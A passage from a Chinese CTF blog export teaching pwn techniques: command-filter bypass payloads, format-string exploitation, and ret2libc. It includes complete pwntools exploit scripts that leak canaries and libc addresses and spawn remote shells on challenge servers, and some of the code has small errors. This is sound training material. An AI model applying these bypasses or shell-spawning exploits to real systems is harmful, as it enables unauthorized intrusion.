局限性\n需要有**足够大的空间**来塞下整个sigreturn frame\n需要**有可写入的空间**，如bss,data,栈等等","tags":["Stack","Pwn"],"categories":["网络安全"]},{"title":"pwn常见绕过","url":"/2023/12/02/常见绕过/","content":"\n\n\n如题，总结一下我目前在pwn中常见的一些绕过，方便以后随时查阅\n\n# strlen\n这是**检验字符串长度**的函数，常见的形式是“当字符串个数＞number时，失败”，绕过它其实很简单，在**输出的字符串开头加上'\\x00'**，这样strlen就不会检测后续字符串的个数了，就完成了绕过\n# strncmp\n指定比较size个字符串，有三个参数。前一二为比较的字符串，第三个参数为size\n\n     strncmp(string1,string2,size)\n## 比较规则\n     0 - 如果两个字符串相等\n    <0 - 如果 string1 小于 string2（负数）\n    >0 - 如果 string1 大于 string2  (正数)\n## 常见样式\n    ！strcmp(&buf[j],\"flag\"/\"cat\"....,size)\n这样的格式可以理解为“过滤”，这些字符串都不能用，如果用了这些字符串，就很有可能退出运行（如果该函数是这么定义的话）\n## 过滤\"cat\"的方法\n### ①.和cat有近乎相同作用的指令\n\n     tail / head / tac / nl / grep / more / less flag都可以查看flag文本内容\n不过它们之间有一些细微的差别，如果想要了解更多，可以看这几篇博客\n> https://blog.csdn.net/weixin_38330025/article/details/114484231 （tail,head,cat的区别和详细用法）\nhttps://blog.csdn.net/u014314592/article/details/130252954 (cat,tail,head,more,grep的释义和基础用法)\nhttps://blog.csdn.net/weixin_53202576/article/details/130995515 （cat与tac）\nhttps://www.cnblogs.com/hsh96/p/17668897.html （nl的释义和用法）\nhttps://blog.csdn.net/u012581020/article/details/131637698 （less的释义和用法详解）\n\n### ②.linux机制小trick（稀里糊涂）\n还有一个\"**???/???/????**\"的过滤方法，是**跟linux机制有关**的，但是博主没弄懂，也不确定这是不是有条件要求的。我个人理解就是cd /filename/filename后cat ./*，不知正确与否，这个方法在不懂的情况下能不用尽量别用，还**有其它更好理解的方法，没必要用这个**。\n### ③.编码拼接绕过（有些繁琐，但是有些时候意外有用）\n\n    a=c;b=at;c=f;d=lag.txt;\n    $a$b ${c}${d}\n效果如图\n![image](https://img2023.cnblogs.com/blog/3326078/202312/3326078-20231202161139847-712100041.png)\n\n### ④.解码绕过（这真的是鬼才，还有这种方式...）\n    `echo 'Y2F0Cg==' | base64 -d`  flag.txt\n> 了解自:https://blog.csdn.net/qq_42383069/article/details/130221725\n后面好些也都是摘自这篇博主的博客，实在是太涨知识了\n\n### ⑤.反斜杠绕过\n    c/at fl/ag.txt\n\n### ⑥.单双引号绕过\n    c'a't flag.txt\n    c\"a\"t flag.txt\n\n## 过滤\"flag\"的方法\n### ①. ./*\n     cat ./*\n此命令相当于**查看当前目录下所有文件的内容**，当然，只能查看文本文档，文件夹是看不了的\n\n### ②. f*\n    cat f*\n这个**等效于cat flag**，挺好的\n## 过滤\"sh\"的方法\n     $0\n此指令作用**等效于“sh”\"bin/sh\"**，进行**提权**\n## 过滤' '（也就是空格）的方法\n\n使用下列字符代替\n\n    <\n    ${IFS}\n    $IFS$9\n    %09\n\n------------\n$ IFS 在 **linux 下表示分隔符**，只有cat$IFSa.txt 的时候, bash 解释器会把整个 IFSa当做变量名，所以导致没有办法运行，然而如果**加一个 {} 就固定了变量名**，同理**在后面加个 $ 可以起到截断的作用**，而 **$9 **指的是当前系统shell 进程的第九个参数的持有者，就是一个**空字符串**，因此 $9 **相当于没有加东西**，等于做了一个**前后隔离**。\n> 这句话仍旧是摘自这篇博客：https://blog.csdn.net/qq_42383069/article/details/130221725\n\n------------\n2023.12.2\n","tags":["Pwn"],"categories":["网络安全"]},{"title":"格式化字符串漏洞","url":"/2023/11/30/格式化字符串漏洞/","content":"\n\n\n怎么说呢，这个东西感觉相当不好写，涉及到的知识点很多，不一定能讲明白，我自己写的话只能尽量往基础的知识点上写了，若有不准确之处，希望佬们能及时指出，让我加以修改。\n\n# 格式化字符串漏洞\n## 概念\n格式化字符串漏洞的形成原因在于printf/fprintf/vsprintf等**格式化字符串打印函数在接受可变参数**时，因码农自己偷懒写，**编写的形式不正确而形成的漏洞**。当然，这是比较诙谐的说法。\n真正形成的原因是，当初创建printf函数的这批人没有让printf去检测**格式化字符串的占位符个数与参数个数是否相等**。只要在执行printf时，每读取到一个占位符，就会**到相应的地址里获取数据**并**根据占位符的类型进行解码输出**。所以即使你没有参数，它也是可以进行输出的\n举个例子：\n```C\nchar true[0x100]\n规范写法：printf(\"%s\",true)\n懒人：printf(true)\n```\n这个时候就产生了格式化字符串漏洞。\n更**直观**的来个代码\n```C\n#include<stdio.h>\nint main()\n{\n   int a = 233;\n   printf(\"a=%d\",a);\n   return 0;\n}\n```\n理所当然，最终打印出a=233\n\n\n![image](https://s2.loli.net/2024/12/03/52jM3LyBaKdCisH.png)\n\n那如果我们这样呢？\n\n```C\n#include<stdio.h>\nint main()\n{\n   int a = 233;\n   printf(\"a=%d\");\n   return 0;\n}\n```\n那么就会出现一个很抽象的结果，至于为什么是负数，这就与补码有关了，只要知道这是个很大的数字，没记错的话，在十六进制里，这个数字是0xf开头，要么是动态链接库的地址，要么是栈的地址\n> 与补码有关知识链接：https://blog.csdn.net/zk_lar/article/details/125072002\n\n\n\n![image](https://s2.loli.net/2024/12/03/tyZxfG8KzAXhuH3.png)\n\n既然我们可以在没有参数的情况下读取到占位符里边的数据，那么我们就可以利用这一点来**泄露某一函数的地址，canary的值甚至直接获得flag**\n\n## 格式化字符串\n在写这个之前先叠个甲，因为这个是针对**初学者**的（包括博主自己也是初学者），所以有些概念可能会被简化甚至是忽略（因为初期确实不常用），主要写的都是在早期时常常用到的。若有不正之处，还希望能够多多包涵。\n### 基本格式\n```C\n%[parameter][flags][field width][.precision][length]type\n```\n我们需要**关注**的是\n#### parameter\n     n$，获取格式化字符串中的指定参数，比如%6$p表示从当前地址数起，获取往后偏移第6个字节长度的地址，类似于\"%p%p%p%p%p%p\"，但是前五个\"%p\"不会生效\n     但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化串开始的第一个，应该是%7$n\n     如图所示\n\n\n\n![image](https://s2.loli.net/2024/12/03/k4R8EGyAZwbmJNn.png)\n\n#### length\nh输出2字节\nhh输出1字节\n#### field width\n输出的最小宽度\n#### type(格式化字符串占位符类型)\n##### %d/%i\n输出有符号的十进制整数。\n##### %u\n输出无符号的十进制整数（可以默认为自然数）\n##### %x/%X\n输出十六进制数，且输出**4字节**长\n注：其输出的数值是**不带\"0x\"开头**的\n##### %lx\n同%x，但输出的是**8字节**长\n##### %p\n输出十六进制数据，**附带\"0x\"开头**，且**x86下输出4字节，x64下输出8字节**。\n常用于泄露地址\n###### %x,%lx,%p的建议\n多数情况下都**建议用%p来泄露地址**，既容易辨别出不同的地址（免得没有\"0x\"开头后混淆了)，又可以不用考虑位数(x86,x64)的区别。除非某些题目实在太细了，细到需要靠%nx来泄露参数，否则都建议用%p进行地址泄露。\n##### %s\n输出字符串。也就是在**进入对应地址之后将地址之中保存的值解析并输出出来**。比如0x4040c0里有存有flag的值，则可以通过%s通过偏移计算来获取flag的值。\n常用于简单的格式化字符串漏洞题中**直接获取flag的值**，或者是**泄露某函数在got表里的真实地址**，然后又可以用快乐的ret2libc手法进行攻击了\n注：%s会有**零截断**，比如0x00402004%s，在遇到x00后后边会**无法读取**，造成**泄露失败**，所以还是得根据情况使用%s。另外，当%s读取的是**非法地址**（如非用户态所能进行读取的地址，也就是**权限不够**；或者**本身地址就是错误的**等等）时，**程序会崩溃**，所以一般情况下**不用%s%s%s%s这样的形式进行数据读取**\n且%s将会把指定地址中的数据**按照字符形式(ASCII)进行输出**，但是在ASCII中有一些字符是**不可见字符**。如果**输出不可见字符的话将会被省略**。那么即使程序进行输出我们也无法进行接收。如果对应地址中的数据中有**至少一个可见字符**，将会全部进行输出，这时我们**可以进行接收**,这在我们**泄露libc地址**的时候非常重要，若是泄露的got表**不存在可见字符**，那么**输出就会被省略**，我们就没法通过泄露got表的函数地址进而计算libc基地址\n> 第二段修改自：https://www.freebuf.com/articles/system/317425.html\n##### %c\n输出字符。比如%100c，会填充100个'\\x00'字符，可用于快速覆盖\n具体的展示效果如下\n```C\n#inclde<stdio.h>\nint main()\n{\n    printf(\"%100ctest!\\n\");\n\treturn 0;\n}\n```\n\n\n![image](https://s2.loli.net/2024/12/03/JtXpE2IOWY6PbKM.png)\n\n常与%n搭配向特定地址写入数据（写入数据是%n的功能，%c是为了快速到达该地址，类似填充垃圾值)\n\n##### %n\n将%n前的已成功打印出的字符个数写入指针所指向的地址内，且写入的字节大小为**4字节**。\n比如：\n```C\n#include<stdio.h>\nint main()\n{\n\tint a;\n\tprintf(\"test%n\\n\", &a);\n\tprintf(\"The number of a is %d\", a);\n\treturn 0;\n}\n```\n效果为往a所处的地址内写入4（t,e,s,t的字符个数为4)，近似于*a = 4这一表达式\n\n\n![image](https://s2.loli.net/2024/12/03/qF3udPTgRMbkWVC.png)\n\n如果缺少参数\n\n```C\n#include<stdio.h>\nint main()\n{\n\tint a;\n\tprintf(\"test%n\\n\");\n\tprintf(\"The number of a is %d\", a);\n\treturn 0;\n}\n```\n则会将4写入到\"test%n\"上面一格的内存当中，而a无变化\n\n\n![image](https://s2.loli.net/2024/12/03/VND9RehZwqWoiIY.png)\n\n故%n常常用来**篡改某一地址的内容**，也是**格式化字符串漏洞的核心攻击方式之一**\n注：①.%n的payload构造在x86和x64的情况下是**不一样**的。在**x86**的payload中，改写got表的地址可以放在前面，因为它的地址的字节均为有效，**不会被截断**。而**x64**的payload中，由于打印出的got表地址中**有效字节为6位**，**高位字节为‘00’**，在字符串里就是**终止符**的意思，当调用printf输出到‘00’时，就会**终止输出**，造成攻击失败\n   ②.当低字节写入的个数大于高字节的个数的时候，就应该运用补码了。\n   比如你在低字节已经写入了0x5678，而在该got表的got+2处想再写入0x1234，则需要写入-0x4444(-0x5678+0x1234)。\n   在补码下，-0x5678 = 0xa988\n   而-0x4444=0xa998+0x1234=0xbbbc=(0x10000 - 0x5678) + 0x1234 ，通用公式为后半部分\n   即 (0x10000 - 已写入低位字节的数字) + 想写入高位字节的数字\n\n> 摘自：https://www.bilibili.com/video/BV1Uv411j7fr/?p=13&vd_source=51fe165aa505d5468e1ceabe09364ef5\n###### ①%n的衍生\n1.%hn-->2字节\n2.%hhn-->1字节\n3.%ln-->32位4字节，64位8字节\n4.%lln-->8字节\n###### ②%n及其衍生的使用小建议\n在攻击的时候，原则上是**能使用hhn绝不用hn，能使用hn绝不用n**，这是有原因的。一是因为一个**%n**传输的是**int大小的字符个数**，会使printf输出大量的字符数量，**可能造成程序崩溃**。二是因为在输出大量的字符数量后，自己也不好接收数据，**很难做到精确控制我们需要修改的地方**。所以一般来说我们都是**%hhn和%hn结合使用**的，**使数据更加稳定可控**\n\n这些基本就是利用格式化字符串漏洞的时候会用上的占位符，其中以**%p,%s.%n最为重要**，**%c**可以起很好的**辅助**作用\n\n## 攻击手法\n### ①.通过IDA（或者其它能反编译的工具)**寻找有格式化字符串漏洞的函数**\n形如：\n```C\n     printf(&buf)\n\t\\*or*\\\n\t printf(buf)\n\t \\\\其实这两个都是一个意思，只不过看你的反编译器怎么显示\n```\n### ②.找到漏洞函数后，通过**nc连接**后，求**偏移量**\n求偏移量我们**常常使用\"AAAA\"作为定位符**，然后用\"%p-%p-%p-%p-%p...\"泄露地址求取偏移量（\"-\"并无实际意义，只是把地址分隔开，便于数出偏移量)，因为定位符是\"A...\"，所以当我们看到地址里有**形如\"0x414141...\"或\"0x...4141...\"这样的地址**时，数出第一个地址到这一个地址的个数，这就是偏移量，**是我们能够控制的参数**。\n注:千万别数错了，我们求偏移量要求的是**从格式化字符串的参数开始数起**的，而不是从printf的第一个参数开始数的。以我②中为例子\n\"AAAA\"是printf的第一个参数，而第一个\"%p\"才是我们的格式化字符串的第一个参数，如图\n\n![image](https://s2.loli.net/2024/12/03/sHvrY83wZSgKUeQ.png)\n\n这就是求取偏移量的方法，在这里是偏移量为6,**\"nil\"其实也是个地址**，它的地址是0x0，但是它是显示不出来的，所以是显示为了\"nil\"，**不可忽略**！\n\n### ③.因题而异\n其实就没什么别的手法了，上面两个是最通用的了，剩下的攻击手法就是看题目让你做什么了，常见的有**泄露canary值(%s)，泄露libc地址(%p)或者覆盖内存(%n)**，没有个固定套路。\n\n## 例题\n### ①.[HNCTF 2022 Week1]fmtstrre（%s的基础应用)\n首先我们checksec\n\n\n![image](https://s2.loli.net/2024/12/03/RjJOCqBDwkxhXUN.png)\n\n嗯，NX保护开启，无法往栈上堆代码，Partial RELRO的开启让部分地址随机化，没法直接使用地址，再看看IDA代码\n\n\n![image](https://s2.loli.net/2024/12/03/gxmvk5YiRWwJ3A6.png)\n\n可以看到，它会**尝试打开一个叫做\"flag\"的文件**，并且把flag里的内容输出到name的地址里边，相当于给name赋值了。如果没有\"flag\"文件，就输出\"Open failed\"。然后我们就看到printf(buf)，明显的格式化字符串漏洞，**read函数可以泄露出printf里我们的可控参数**，那么接下来思路就明了了，**通过控制泄露出的可控参数，来打印出远端的\"flag\"内容**\n既然题目要求我们打开\"flag\"，那我们就把ELF程序与**自建的名为\"flag\"的文本**放在同一个文件夹下\n\n![image](https://s2.loli.net/2024/12/03/7szAuFlK8nSUW1L.png)\n\n然后，首先**计算出可控参数的偏移量**这里提供两种求取偏移量的方法\n①.**nc**然后爆破\n\n\n![image](https://s2.loli.net/2024/12/03/mcJZqkp37NKbIsU.png)\n\n通过计算可以得出在printf里的可控参数偏移量为6\n接下来就是该动态调试了，确认&name在printf里的偏移量，断点下在read函数，然后在**调用printf时进入stack中查看偏移量**\n\n![image](https://s2.loli.net/2024/12/03/AK16e4zMXOQbBxo.png)\n\n可以看到，**此时name相对rdi的偏移量为0x20，换算为十进制就是32，那么总体的偏移量就是32+6=38**\n②.在gdb调试的时候使用\"**fmtarg addr**\"进行偏移量求取，这可比我数快多了\n\n![image](https://s2.loli.net/2024/12/03/7z4fdnQkPyaGiBF.png)\n\nPS：其实还有第三种方法，就是pwntools里提供的类（可以近似理解为struct)FmtStr和函数fmtstr_payload函数，学会这个后能大大提高我们做格式化字符串漏洞题目的速度，不过博主其实还搞不懂它的格式和原理，有兴趣的小伙伴可以看这个链接\n\n> https://blog.csdn.net/qq_33976344/article/details/113503914\n\n此时，直接nc即可\n\n\n![image](https://s2.loli.net/2024/12/03/ZMst4yScVlJCAN3.png)\n\n这就直接拿到了flag的值，这既是%s的基础应用，直接拿取flag\n\n### ②.CGfsb(%n的基础用法)\nchecksec\n\n\n![image](https://s2.loli.net/2024/12/03/kenjhgtUVMOK7Fc.png)\n\nRELRO和NX开了，不多赘述，Canary也是开的，表明我们如果没法泄露出Canary的值就没办法进行栈溢出，但要不要这样做，还得看题目要求，先看题目代码\n\n\n![image](https://s2.loli.net/2024/12/03/kqNn71gic8QdHuT.png)\n\n还是一眼看出格式化字符串漏洞，然后就是后面紧跟着“如果pwnme==8，你就可以拿到flag，否则啥也没有”的逻辑，那思路就是篡改pwnme地址里储存的值，将其改为8即可，那么现在就是要先**拿到pwnme的地址**，然后**篡改**里边的内容。IDA里很容易就能找到pwnme的地址\n**bss区可以理解为尚未赋值的区域**,比如\n\n```C\n int a;\n scanf(\"%d\",&a);\n```\n就像这里边的a，只是定义了a这个变量，但还等着你往里面输入数值呢。\n好了，拿到地址后就该**泄露printf里的可控参数**了，**nc**，启动！\n\n![image](https://s2.loli.net/2024/12/03/2DZz49TyCwVYHXF.png)\n\n前边有演示过怎么数了，我这次就不p图了，随便数一下就能算出可控参数的偏移量为10，ok,现在就可以构造脚本了\n\n```Python\nfrom pwn import *\np = remote ('61.147.171.105',65204)\n#offset = 10\npwnme_addr = 0x804A068\np.recvuntil(\"name:\\n\")\np.sendline(\"Dusk\")\np.recvuntil(\"please:\\n\")\npayload = p32(pwn_addr) + b'aaaa%10$n' #因为是32位，所以用p32打包，而p32占4字节，为了将pwnme赋值为8，我们需要填充垃圾数值，于是填充了'aaaa'，这下就成功打印了8位数字了，于是使用%10$n(此时pwnme_addr位于printf的格式化字符串参数的第十个餐宿上)将pwnme赋值为8了\np.sendline(payload)\np.interactive()\n```\n运行脚本即可\n\n\n![image](https://s2.loli.net/2024/12/03/2vairFk7zAs35TI.png)\n\n这就是%n的基本用法，%n会有很多拓展题，比如连续的用%n赋不同数值，计算的偏移量会有所不同，不过这都是比较难的题了，博主本人也不会写，所以就写个基础格式化字符串漏洞题目，希望大家都能有所收获\n\n### ③.[2021 鹤城杯]littleof（使用格式化字符串漏洞泄露Canary值)\n懒了！\n\n\n![image](https://s2.loli.net/2024/12/03/lzPwixhfDW9H2Nn.png)\n\n太喜欢，canary开了捏，栈溢出难用了捏，看看IDA代码吧~\n\n\n![image](https://s2.loli.net/2024/12/03/bzWPyhSqaoRVNlF.png)\n\n\n\n![image](https://s2.loli.net/2024/12/03/9hnQqgcAC1TvS4b.png)\n\n看得出来，Canary的值被储存在了v3中，v3也包含在buf里，而第二个printf函数可以泄露出Canary值，那么我们现在要做的就是先确定**v3相对于buf的偏移量**，**确保不会冲掉Canary**\n\n\n![image](https://s2.loli.net/2024/12/03/prCuRhmeAMzSU4X.png)\n\n\n\n![image](https://s2.loli.net/2024/12/03/x6PeRFI5lbELQyZ.png)\n\n可以算出offset = 0x50 - 0x08 == 0x48\n获取偏移量后，我们就要开始泄露Canay的值了，要合理利用printf里给的%s，**泄露出Canary的值**，因为它会读取buf里所有值，所以它理所当然会读取到Canary的值，我们只需要从最后一个垃圾值开始接收数据就好，此时的脚本如下\n\n```Python\nfrom pwn import *\ncontext(arch = \"amd64\",os = \"linux\",log_level= \"debug\")#开启debug是为了更好查看Canary的值是如何接收的\np = remote('node4.anna.nssctf.cn',28565)\noffset_canary = 0x50 - 0x08 #result == 0x48\npayload_canary = offset_canary * b'A'\np.recvuntil(\"Do you know how to do buffer overflow?\\n\")\np.sendline(payload_canary)\np.recvuntil(\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\n\")#在垃圾值之后开始接收Canary的数值，有个\"\\n\"是因为sendline会发送一个\"\\n'，不能让它影响后面的数据接收\ncanary_addr_first = u64(p.recv(7).rjust(8,b'\\x00'))#虽然Canary占8字节，但是Canary默认是'\\x00'结尾的，所以我们只用接收7字节，rjust向右对齐\n#log.success(\"Canary:\"+(hex(canary_addr_first)))\n```\n在获取Canary值后，就可以进行栈溢出了。但是从刚刚IDA里我们没有找到后门函数，里边也没有system函数和bin/sh，那这又是激动人心的ret2libc环节，好耶！\n那么又是ROPgadget起手时刻！\n\n![image](https://s2.loli.net/2024/12/03/Bor4OL9H3jDs2eh.png)\n\nOK，是心动的感觉，又可以构造脚本了~\n\n```Python\n#这是包含上边的脚本的！为了便于理解所以分了两次来写\nfrom LibcSearcher import LibcSearcher\nelf = ELF('./2021_鹤城杯_littleof')\nrdi_ret_addr = 0x400863\nret_addr = 0x40059e \n> 需要ret的原因见我上一篇博客ret2libc:https://www.cnblogs.com/falling-dusk/p/17856141.html#需要ret的原因见我上一篇博客ret2libc:https://www.cnblogs.com/falling-dusk/p/17856141.html\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\nmain_addr = 0x400789\npayload_overflow_first = offset_canary * b'A' + p64(canary_addr_first) + 0x08 * b'A' + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr) #泄露出puts函数的真实地址并跳转回main进行循环\np.recvuntil(b'Try harder!')\np.sendline(payload_overflow_first)\np.recvuntil(\"I hope you win\\n\")\nreal_puts_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00'))#接收puts函数的真实地址\nlibc = LibcSearcher('puts',real_puts_addr)#libc.so版本搜寻\nlibc_base = real_puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\np.recvuntil(\"Do you know how to do buffer overflow?\\n\")\np.sendline(payload_canary)\np.recvuntil(\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\n\")\ncanary_addr_second = u64(p.recv(7).rjust(8,b'\\x00'))#因为每次装载程序时地址都会随机化，同样Canary值也会改变，所以还需要再泄露一遍\npayload_overflow_second = offset_canary * b'A' + p64(canary_addr_second) + 0x08 * b'A' + p64(ret_addr) + p64(rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)\np.recvuntil(b'Try harder!')\np.sendline(payload_overflow_second)\np.interactive()\n```\n这是分两次的脚本，合起来如下\n```Python\nfrom pwn import *\nfrom LibcSearcher import LibcSearcher \ncontext(arch = \"amd64\",os = \"linux\",log_level= \"debug\")\np = remote('node4.anna.nssctf.cn',28565) \nelf = ELF('./2021_鹤城杯_littleof')\noffset_canary = 0x50 - 0x08 #result == 0x48\npayload_canary = offset_canary * b'A'\nrdi_ret_addr = 0x400863\nret_addr = 0x40059e\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\nmain_addr = 0x400789\np.recvuntil(\"Do you know how to do buffer overflow?\\n\")\np.sendline(payload_canary)\np.recvuntil(\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\n\")\ncanary_addr_first = u64(p.recv(7).rjust(8,b'\\x00'))\nlog.success(\"Canary:\"+(hex(canary_addr_first)))\npayload_overflow_first = offset_canary * b'A' + p64(canary_addr_first) + 0x08 * b'A' + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)\np.recvuntil(b'Try harder!')\np.sendline(payload_overflow_first)\np.recvuntil(\"I hope you win\\n\")\nreal_puts_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00'))\nlibc = LibcSearcher('puts',real_puts_addr)\nlibc_base = real_puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\np.recvuntil(\"Do you know how to do buffer overflow?\\n\")\np.sendline(payload_canary)\np.recvuntil(\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\n\")\ncanary_addr_second = u64(p.recv(7).rjust(8,b'\\x00'))\npayload_overflow_second = offset_canary * b'A' + p64(canary_addr_second) + 0x08 * b'A' + p64(ret_addr) + p64(rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)\np.recvuntil(b'Try harder!')\np.sendline(payload_overflow_second)\np.interactive()\n```\n运行脚本，选对libc.so的版本即可\n\n----------------------------------------------------------------------------------------------------------------\n\n![image](https://s2.loli.net/2024/12/03/tT8wySklAhWEsKV.png)\n\n## 总结：\n虽然各位佬都说格式化字符串漏洞很简单，但我真不这么觉得，我总觉得这比我当初学ret2libc还**难**，这个的攻击手法更多，而且需要的**操作控制也更精细**，难度就非常灵活，简单的确实就是跟基础题差不多，难的就是要**各种调试**，计算不同的偏移量，**控制输出程度**，总体而言非常的费脑细胞，让我非常痛苦，我只希望在接下来的时间里能更加熟练格式化字符串，争取做出更多的题，这样我才有信心去学习堆啊（悲）","tags":["Stack","Pwn"],"categories":["网络安全"]},{"title":"ret2libc","url":"/2023/11/25/ret2libc/","content":"\n\n\n**这一篇主要记录的就是有关libc泄露了，困扰了我许久的玩意终于有写出来的一天了，不容易啊（哭）**\n不过理解了之后确实就会觉得好写很多嘞\n在写题解之前还是写写**libc泄露的原理和流程**比较好，毕竟我自己学的时候搜索各种资料、看各种视频，真的都看得头大，一路摸爬滚打属实不易，我也希望能写出一篇能让别的初学者看得懂的原理解析。\n\n# 一、libc讲解\n## (1).为什么要libc泄露\n答：其一，当然是因为题目**没有给**啊！比如你想要**system()函数**，你想要**bin/sh**，但是给你的附件里边没有，然后想用ROPgadget看看能不能用ret2syscall的方法却也发现合适的**pop|ret**少之又少或根本就没有给你**0x80和0xb**。其二，就是开了PIE和RELRO，地址随机化让我们无法直接调用函数。这个时候就需要靠libc泄露地址来进行攻击了\n## (2).怎样实现libc泄露\n要想通过libc进行地址泄露，那么我们就得先认识两个东西,GOT表(Global Offset Table)和PLT表（Procedure Linkage Table）\n**GOT表（全局偏移表）**里存储着**被调用函数真正的地址**，而**PLT表（程序链接表）**里则储存着**被调用函数的GOT表的地址**给个流程图会好理解一些，以system为例，我自己画的可能有些粗略，希望能提供帮助\n### PLT表和GOT表的调用流程\n#### 首次调用\n\n\n![image](https://s2.loli.net/2024/12/03/38PsqWIREDukzUf.png)\n\n#### 再次调用\n\n\n![image](https://s2.loli.net/2024/12/03/NTnXiBux4GCcHgW.png)\n\n如果还看不懂，那我再打个比方。**顾客（system)**下单，**平台(system@plt)**接单，平台把单子给**骑手(system@got)**，骑手纳闷：你给我单子有啥用啊，给我外卖让我送啊。告诉平台：“火速备餐！”过了一会儿后，平台把**外卖(system的真实地址)**给骑手了，骑手把外卖送到顾客手上。这就是首次调用函数时所经历的过程。至于之后多次的调用，可以理解为，平台备餐做多了，刚好有个单子来就可以直接给骑手让骑手去送。生动形象！\n所以，我们如果做ret2libc的题目，其核心就是通过plt表和got表，来泄露出函数的真实地址，然后构建**基地址**\n\n### 基地址\n#### 什么是基地址？\n基地址是一个固定的内存地址，你**可以把它理解为got表里存储的函数的真实地址**，它是一个绝对地址，是内存加载时的**起始地址**。打个比喻的话，那就是，如果你站在大地上，那么大地就是基地址，地面到你头顶的距离可以称为偏移地址，地面到高楼楼顶也是一个偏移地址，大地是一个基底，你们的存在都在大地之上。说点学pwn的人都知道的，那就是，它在**x64的情况下是0x7f开头**，在**x86的情况下是0xf7开头**，别把它和**虚拟地址**搞混了\n#### 为什么需要基地址？\n因为基地址是一个基底，我们可以根据**基底+偏移量**就可以**调用任意一个在libc.so文件里的函数**，那flag不就犹如探囊取物？\n### 总思路\n1.构建**第一次**payload：栈溢出——泄露libc某一函数真实地址——ret某一可执行函数地址（通常是main，这一步的目的是循环）\n2.**获取**泄露出的真实地址\n3.构造**基地址**，并根据**基地址＋偏移量**来调用特定函数\n4.构造**第二次**(x64)payload:栈溢出——libc中的bin/sh地址——libc中的system函数地址\n               (x86)payload:栈溢出——libc中的system函数地址——打包的垃圾数据——libc中的bin/sh地址\n5.交互获得权限\n## (3).例题：[2021 鹤城杯]babyof（最基本的ret2libc，没有代码审计和陷阱）\n首先checksec\n\n\n![image](https://s2.loli.net/2024/12/03/W5l4LfuOix1qk89.png)\n\n开启了NX保护和Partial RELRO，没法在栈上写代码，地址随机化让我们无法使用ret2txt手段。\n再用ROPgadget看看能不能构造gadget链\n\n![image](https://s2.loli.net/2024/12/03/3HxT2CKpnOMtysL.png)\n\n发现符合要求的少得可怜，没法用ret2syscall\n看看IDA代码\n\n![image](https://s2.loli.net/2024/12/03/f9hWlKxizGv6rCA.png)\n\n\n\n![image](https://s2.loli.net/2024/12/03/xLRMmo4IlbJwdXz.png)\n\n没有后门函数，也没有system和bin/sh提供给我们，为今之计，只有ret2libc了\n在上边我们已经通过ROPgadget获取了rdi_ret_addr了，再取一个ret地址。至于为什么要ret地址，我们最后讲。\n然后现在就是要通过栈溢出来泄露libc地址了，这里我们选择泄露puts函数的地址。不过记住，它是x64系统，参数先存在寄存器上，当参数超过6时，才会在往栈上传参。\n所以第一次我们构造的脚本是这样的\n\n```python\nfrom pwn import *\np = remote('node4.anna.nssctf.cn',28947)\nelf = ELF(\"./2021_鹤城杯_babyof\")\noffset = 0x40 + 0x08\nmain_addr = 0x000000000040066B\npop_rdi = 0x0000000000400743\nret = 0x0000000000400506\nputs_plt = elf.plt['puts'] #puts在plt表中的地址\nputs_got = elf.got['puts'] #puts在got表中的地址\npayload_first = offset * b'a' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr) #先调用got表告诉plt表我没有puts函数地址，然后再次调用plt表给将puts函数的地址泄露出来，最后跳转回main函数再次执行\np.sendlineafter(\"overflow?\\n\",payload_first)\np.recvuntil(\"I hope you win\\n\")#第一次函数执行结束\nreal_puts_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00'))#u64是接收字节流，\\x7f是64位程序函数地址的默认开头，读取7f往前6字节（在内存中，字节是倒着放的）  然后用ljust来补齐8字节，\\x00是填充字符，不会影响数据\n```\n到此，我们puts的真实地址就泄露完毕了，接下来就要构建libc_base然后根据偏移量调用在libc.so里的函数，再次构造payload，第二次的攻击如下\n```python\nfrom LibcSearcher import LibcSearcher\nlibc = LibcSearcher(\"puts\", real_puts_addr)\nlibc_base = real_puts_addr - libc.dump(\"puts\")\nsystem_addr = libc_base + libc.dump(\"system\")\nbinsh_addr = libc_base + libc.dump(\"str_bin_sh\")\npayload_end = offset * b'a' + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)\np.sendlineafter(\"overflow?\\n\",payload_end)\np.interactive()\n```\n因为我本人还并不太会使用gdb进行动态调试，根据本地泄露的地址来推测libc.so的版本，所以用的是LibcSearcher库\n如果要用动态调试来泄露地址来推测libc.so版本，这里推荐用**https://libc.rip/**\n如果是跟我一样不擅长使用gdb的，还是初学者的，可以用LibcSearcher库。不过这并不是长久之策，LibcSearcher已经很久没有维护过了，有些版本LibcSearcher是搜不到的，要想在pwn上走得更远，**动态调试必不可少**，可以说既是**基础**，也是**精髓**，更是**核心**！\n好了，那现在是总的脚本\n```python\nfrom pwn import *\nfrom LibcSearcher import LibcSearcher\np = remote('node4.anna.nssctf.cn',28947)\n#p = process(\"./2021_鹤城杯_babyof\")\nelf = ELF(\"./2021_鹤城杯_babyof\")\noffset = 0x40 + 0x08\nmain_addr = 0x000000000040066B\nret = 